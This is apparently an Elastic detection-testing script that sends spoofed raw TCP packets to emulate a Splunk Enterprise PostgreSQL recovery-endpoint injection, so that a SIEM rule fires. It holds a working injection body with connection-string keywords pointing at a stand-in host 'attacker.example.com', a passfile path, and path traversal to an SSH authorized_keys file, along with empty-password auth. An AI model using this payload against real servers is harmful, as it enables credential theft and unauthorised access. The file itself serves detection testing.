# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Splunk Enterprise PostgreSQL Recovery Endpoint Injection Artifacts
# RTA: network_splunk_postgres_recovery_body_injection.py
# Description: Emulates the CVE-2026-20253 exploit artifacts sent to the Splunk
#              Enterprise PostgreSQL sidecar recovery endpoints. The `database`
#              JSON field is passed straight to `pg_dump`/`pg_restore` as a libpq
#              connection string, so attacker-supplied keywords (hostaddr=, host=,
#              passfile=, dbname=template1, ...) override the hardcoded local
#              config, and the `backupFile` field controls the dump path enabling
#              arbitrary file placement.
#
#              This RTA crafts a single complete HTTP transaction on the wire via
#              raw IP/TCP packets:
#                SYN -> SYN/ACK -> PSH/ACK (HTTP POST request)
#                    -> PSH/ACK (HTTP 400 response) -> RST
#
#              The POST targets `/services/splunkd/__raw/v1/postgres/recovery/backup`
#              and carries a JSON body packed with the public exploit-chain
#              artifacts so it matches the rule's body-injection branch on many
#              terms at once:
#                - "database" connection-string keywords: host=, hostaddr=, port=,
#                  user=, password=, sslmode=, service=, dbname=, passfile=
#                - "backupFile" path traversal / suspicious destinations: ../,
#                  /opt/splunk/etc/apps/, /home/<user>/.ssh/, authorized_keys
#                - filesystem artifacts: /opt/splunk/etc/apps/ and the watchTowr
#                  .pgpass restore-chain string
#              An empty-password HTTP Basic auth header (Authorization: Basic for
#              "admin:") reproduces the credential artifact in the public PoC,
#              matching the Zeek auth branch (url.password : "").
#              The crafted HTTP 400 response reproduces the vulnerable-handler
#              probing branch (status_code 400 on the recovery path).
#
#              A network sensor with HTTP parsing — Packetbeat / network_traffic
#              (logs-network_traffic.http*), Zeek (logs-zeek.http*), or Suricata
#              (logs-suricata.eve*) — observing the cleartext recovery traffic
#              (downstream of TLS termination) decodes this as:
#                - http.request.method = "POST"
#                - url.path containing "splunkd/__raw/v1/postgres/recovery/backup"
#                - http.request.body.content carrying the injection keywords
#                - http.response.status_code = 400
#                - url.username = "admin", url.password = ""  (Zeek)
#
#              Source is spoofed (no live Splunk server is required) and the
#              destination is non-local so packets egress the physical NIC where
#              the sensor captures — a loopback destination would route through
#              `lo`, which Packetbeat does not capture. The HTTP 400 response is
#              crafted by this RTA, not returned by a real server.
#
#              Requires CAP_NET_RAW (run as root or with the capability set). The
#              kernel may drop egress packets carrying a foreign source IP under
#              reverse-path filtering; the sensor only needs to observe the
#              packets on the wire to produce the HTTP event.

import base64
import logging
import os
import random
import socket
import struct
import time

from . import OSType, RuleMetadata, register_code_rta

log = logging.getLogger(__name__)

# Splunk Web default port (8000) — it is in the default Network Packet Capture /
# Packetbeat HTTP port list, so the sensor parses this traffic as cleartext HTTP
# without extra configuration. The rule does not filter on port; it matches on
# url.path. (splunkd's management port 8089 is HTTPS by default and not in the
# default HTTP port list, so it would require TLS termination plus an added HTTP
# port; the sidecar can alternatively be monitored on TCP 5435.)
SPLUNK_PORT = 8000

# Source is spoofed so gateway RST/ICMP replies go to a non-existent host and
# never reach our kernel's TCP stack. Destination is non-local so the flow
# egresses the physical NIC the sensor watches.
SPOOFED_SOURCE_IP = "10.20.30.40"
PRIVATE_DESTINATION_IP = "10.10.10.10"

_RECOVERY_PATH = "/services/splunkd/__raw/v1/postgres/recovery/backup"

# Empty-password Basic auth credential observed in the public exploit tooling —
# the username is passed to pg_dump/pg_restore, so any value works.
_BASIC_AUTH = base64.b64encode(b"admin:").decode()

_TCP_RST = 0x04
_TCP_PSHACK = 0x18  # PSH | ACK
_TCP_SYN = 0x02
_TCP_SYNACK = 0x12  # SYN | ACK


def _ones_complement_sum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
    s = (s & 0xFFFF) + (s >> 16)
    s += s >> 16
    return ~s & 0xFFFF


def _build_raw_packet(
    src_ip: str,
    dst_ip: str,
    src_port: int,
    dst_port: int,
    tcp_flags: int,
    seq: int,
    ack_seq: int,
    payload: bytes = b"",
) -> bytes:
    """Build a complete raw IP/TCP packet with optional application payload."""
    src_bytes = socket.inet_aton(src_ip)
    dst_bytes = socket.inet_aton(dst_ip)

    data_offset = 5 << 4  # 20-byte TCP header, no options
    tcp_seg_len = 20 + len(payload)

    tcp_header = struct.pack(
        "!HHIIBBHHH",
        src_port, dst_port, seq, ack_seq,
        data_offset, tcp_flags, 8192, 0, 0,
    )
    pseudo = struct.pack(
        "!4s4sBBH",
        src_bytes, dst_bytes, 0, socket.IPPROTO_TCP, tcp_seg_len,
    )
    tcp_checksum = _ones_complement_sum(pseudo + tcp_header + payload)
    tcp_header = struct.pack(
        "!HHIIBBHHH",
        src_port, dst_port, seq, ack_seq,
        data_offset, tcp_flags, 8192, tcp_checksum, 0,
    )

    ip_total_len = 20 + 20 + len(payload)
    ident = random.randint(0, 0xFFFF)
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, ip_total_len, ident, 0, 64, socket.IPPROTO_TCP, 0,
        src_bytes, dst_bytes,
    )
    ip_checksum = _ones_complement_sum(ip_header)
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, ip_total_len, ident, 0, 64, socket.IPPROTO_TCP, ip_checksum,
        src_bytes, dst_bytes,
    )

    return ip_header + tcp_header + payload


def _injection_body() -> bytes:
    """
    JSON body carrying the CVE-2026-20253 connection-string injection and
    file-placement artifacts. Packed with many of the rule's matched terms so a
    single request fires the body-injection branch robustly.
    """
    database = (
        "host=attacker.example.com hostaddr=203.0.113.10 port=5432 "
        "user=postgres password=Pgpwn1 sslmode=disable service=evil "
        "dbname=template1 "
        "passfile=/opt/splunk/var/packages/data/postgres/.pgpass"
    )
    backup_file = "/opt/splunk/etc/apps/../../../home/splunk/.ssh/authorized_keys"
    return (
        '{"database":"' + database + '","backupFile":"' + backup_file + '"}'
    ).encode()


def _http_post(body: bytes) -> bytes:
    """Build a raw HTTP/1.1 POST with empty-password Basic auth to the recovery endpoint."""
    head = (
        f"POST {_RECOVERY_PATH} HTTP/1.1\r\n"
        f"Host: {PRIVATE_DESTINATION_IP}:{SPLUNK_PORT}\r\n"
        "User-Agent: python-requests/2.31.0\r\n"
        "Accept: */*\r\n"
        f"Authorization: Basic {_BASIC_AUTH}\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    return head + body


def _http_400() -> bytes:
    """Build a raw HTTP/1.1 400 response — what a vulnerable sidecar handler returns."""
    body = b'{"messages":[{"type":"ERROR","text":"invalid recovery request"}]}'
    head = (
        "HTTP/1.1 400 Bad Request\r\n"
        "Content-Type: application/json; charset=UTF-8\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    return head + body


@register_code_rta(
    id="08d871c9-df8b-4b52-8916-39f5673b6775",
    name="network_splunk_postgres_recovery_body_injection",
    platforms=[OSType.LINUX],
    endpoint_rules=[],
    siem_rules=[
        RuleMetadata(
            id="2a7823db-0bc2-48f6-aa2f-e6aef233c6dc",
            name="Splunk Enterprise PostgreSQL Recovery Endpoint Injection Artifacts",
        )
    ],
    techniques=["T1190"],
)
def main() -> None:
    """Emit one POST to the Splunk recovery endpoint with CVE-2026-20253 injection artifacts."""
    if os.geteuid() != 0:
        log.error("Raw socket privileges required (run as root or with CAP_NET_RAW)")
        return

    request = _http_post(_injection_body())
    response = _http_400()
    client_port = random.randint(32768, 60000)
    cli_isn = random.randint(0x10000000, 0x7FFFFFFF)
    srv_isn = random.randint(0x10000000, 0x7FFFFFFF)

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    def send(
        src_ip: str,
        dst_ip: str,
        sport: int,
        dport: int,
        flags: int,
        seq: int,
        ack: int,
        payload: bytes = b"",
    ) -> None:
        pkt = _build_raw_packet(src_ip, dst_ip, sport, dport, flags, seq, ack, payload)
        _ = sock.sendto(pkt, (dst_ip, dport))

    log.info(
        "Splunk recovery body-injection emulation: %s -> %s:%d %s",
        SPOOFED_SOURCE_IP, PRIVATE_DESTINATION_IP, SPLUNK_PORT, _RECOVERY_PATH,
    )

    try:
        # Client SYN
        send(SPOOFED_SOURCE_IP, PRIVATE_DESTINATION_IP, client_port, SPLUNK_PORT,
             _TCP_SYN, cli_isn, 0)
        time.sleep(0.02)
        # Server SYN/ACK
        send(PRIVATE_DESTINATION_IP, SPOOFED_SOURCE_IP, SPLUNK_PORT, client_port,
             _TCP_SYNACK, srv_isn, cli_isn + 1)
        time.sleep(0.02)
        # Client PSH/ACK carrying the HTTP POST with injection artifacts
        send(SPOOFED_SOURCE_IP, PRIVATE_DESTINATION_IP, client_port, SPLUNK_PORT,
             _TCP_PSHACK, cli_isn + 1, srv_isn + 1, request)
        log.info("HTTP POST %s sent with injection body", _RECOVERY_PATH)
        time.sleep(0.05)
        # Server PSH/ACK carrying the HTTP 400 response
        send(PRIVATE_DESTINATION_IP, SPOOFED_SOURCE_IP, SPLUNK_PORT, client_port,
             _TCP_PSHACK, srv_isn + 1, cli_isn + 1 + len(request), response)
        time.sleep(0.02)
        # Client RST closes the flow so the sensor emits the completed transaction
        send(SPOOFED_SOURCE_IP, PRIVATE_DESTINATION_IP, client_port, SPLUNK_PORT,
             _TCP_RST, cli_isn + 1 + len(request), srv_isn + 1 + len(response))
        log.info("Recovery endpoint injection request emitted")
    finally:
        sock.close()
